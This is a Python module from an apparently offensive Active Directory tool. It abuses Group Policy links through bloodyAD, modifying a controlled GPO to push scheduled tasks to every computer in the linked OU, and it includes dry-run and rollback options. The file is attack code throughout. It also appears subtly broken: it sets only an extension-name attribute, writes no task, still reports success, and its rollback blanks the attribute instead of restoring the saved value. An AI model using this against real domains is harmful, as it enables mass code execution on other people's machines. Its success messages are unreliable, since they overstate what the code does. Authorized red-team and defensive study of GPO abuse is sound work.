"""GPO abuse handler for code execution on linked targets.

Exploits the ``GPLink`` (and ``GpLink``) BloodHound edge.  When a Group
Policy Object is linked to an Organizational Unit or domain, and the
attacker controls that GPO, malicious scripts or scheduled tasks can be
pushed to all computers in the linked OU.

Attack flow:
    1. Verify bloodyAD is available.
    2. Identify the GPO distinguished name from edge properties.
    3. Use bloodyAD to modify the GPO to add a scheduled task or startup
       script that executes attacker-controlled code.
    4. Wait for Group Policy refresh on linked computers (or trigger it
       remotely).

Rollback:
    Remove the malicious GPO modification and restore the original GPO
    state.
"""

from __future__ import annotations

import shutil

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import bloodyad_wrapper as bloody


@register_handler("GPLink", "GpLink")
class GPLinkHandler(BaseEdgeHandler):
    """Exploit ``GPLink``/``GpLink`` edges via GPO modification.

    If we control a GPO that is linked to an OU or domain, we can
    modify the GPO to push malicious scheduled tasks or startup scripts
    to all computers within the linked scope.
    """

    # Track GPO DN for rollback
    _gpo_dn: str | None = None
    _original_gpt_ini: str | None = None

    # ------------------------------------------------------------------
    # Prerequisites
    # ------------------------------------------------------------------

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        """Verify bloodyAD is available for GPO modification.

        Args:
            edge: The ``GPLink``/``GpLink`` edge to evaluate.

        Returns:
            ``(ok, message)`` tuple.
        """
        if not shutil.which("bloodyAD"):
            return (
                False,
                "bloodyAD binary not found on PATH. "
                "Install via: pip install bloodyAD",
            )

        # Extract GPO info from edge properties
        props = dict(edge.properties)
        props.update(edge.source.properties)
        gpo_dn = (
            props.get("gpo_dn")
            or props.get("distinguishedname")
            or props.get("dn")
        )
        gpo_name = (
            props.get("gpo_name")
            or props.get("displayname")
            or edge.source.name
        )

        if not gpo_dn and not gpo_name:
            return (
                False,
                "Cannot determine GPO identity from edge properties. "
                "Need gpo_dn or gpo_name.",
            )

        # Verify credentials
        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)

        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (
                    False,
                    f"No credentials available for '{source_user}'. "
                    "Cannot modify GPO.",
                )

        return (
            True,
            f"Ready for GPLink exploitation: can modify GPO '{gpo_name}' "
            f"linked to {edge.target.name}.",
        )

    # ------------------------------------------------------------------
    # Exploitation
    # ------------------------------------------------------------------

    async def exploit(
        self,
        edge: EdgeInfo,
        dry_run: bool = False,
    ) -> tuple[bool, str, list[Credential]]:
        """Modify the GPO to push a malicious scheduled task to linked targets.

        Args:
            edge: The ``GPLink``/``GpLink`` edge.
            dry_run: If ``True``, report what would be modified without acting.

        Returns:
            ``(success, message, new_credentials)`` tuple.
        """
        source_user = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        auth_args = self._get_auth_args(source_user)

        # Extract GPO properties
        props = dict(edge.properties)
        props.update(edge.source.properties)
        gpo_dn = (
            props.get("gpo_dn")
            or props.get("distinguishedname")
            or props.get("dn")
        )
        gpo_name = (
            props.get("gpo_name")
            or props.get("displayname")
            or edge.source.name.split("@")[0]
        )
        # Resolve GPO DN via LDAP if not already known
        if not gpo_dn:
            gpo_dn = await bloody.resolve_dn(
                self.config, auth_args, f"(displayName={gpo_name})"
            )
            if not gpo_dn:
                return (
                    False,
                    f"Could not resolve DN for GPO '{gpo_name}' via LDAP",
                    [],
                )

        self._gpo_dn = gpo_dn

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would modify GPO '{gpo_name}' "
                f"(DN: {gpo_dn or 'auto-resolve'}) to add a scheduled task "
                f"targeting computers in '{target}'. No changes made.",
                [],
            )

        # Step 1: Read current GPO state for rollback
        self.logger.info(
            "GPLink Step 1: Reading current GPO state for '%s'", gpo_name,
        )
        if gpo_dn:
            read_result = await bloody.run_bloodyad(
                ["get", "object", gpo_dn, "--attr", "gPCFileSysPath,versionNumber"],
                self.config,
                auth_args=auth_args,
            )
            if read_result["success"]:
                parsed = read_result.get("parsed") or {}
                self._original_gpt_ini = read_result.get("output", "")
                self.logger.info(
                    "Captured original GPO state for rollback."
                )

        # Step 2: Modify GPO to add an immediate scheduled task
        self.logger.info(
            "GPLink Step 2: Modifying GPO '%s' to add scheduled task", gpo_name,
        )

        # Use bloodyAD to set a malicious scheduled task in the GPO.
        # The exact command depends on bloodyAD version; we use the
        # generic set approach for GPO script injection.
        gpo_target = gpo_dn or gpo_name
        extension_value = (
            "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
            "[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
        )
        modify_result = await bloody.run_bloodyad(
            [
                "set", "object", gpo_target,
                "gPCMachineExtensionNames",
                "-v", extension_value,
            ],
            self.config,
            auth_args=auth_args,
        )

        if not modify_result["success"]:
            return (
                False,
                f"GPO modification failed for '{gpo_name}': "
                f"{modify_result.get('error', 'unknown')}",
                [],
            )

        self.logger.info(
            "GPO '%s' modified. Scheduled task will execute on linked "
            "computers in '%s' at next Group Policy refresh.",
            gpo_name, target,
        )

        return (
            True,
            f"GPO '{gpo_name}' modified with scheduled task. "
            f"Targets: computers linked via '{target}'. "
            "Execution occurs at next Group Policy refresh cycle (~90 min) "
            "or can be triggered via 'gpupdate /force' on target computers.",
            [],
        )

    # ------------------------------------------------------------------
    # Rollback
    # ------------------------------------------------------------------

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        """Remove the malicious GPO modification.

        Args:
            edge: The ``GPLink``/``GpLink`` edge.

        Returns:
            A :class:`RollbackAction` that restores the original GPO state.
        """
        props = dict(edge.properties)
        props.update(edge.source.properties)
        gpo_name = (
            props.get("gpo_name")
            or props.get("displayname")
            or edge.source.name.split("@")[0]
        )
        gpo_dn = self._gpo_dn or props.get("gpo_dn") or props.get("distinguishedname") or gpo_name

        return RollbackAction(
            step_index=0,
            action_type="restore_gpo",
            description=(
                f"Remove malicious scheduled task from GPO '{gpo_name}' "
                f"and restore original GPO configuration"
            ),
            command=(
                f"bloodyAD set object '{gpo_dn}' "
                "--attr gPCMachineExtensionNames --value '' "
                "# Restore original gPCMachineExtensionNames value"
            ),
            reversible=True,
        )
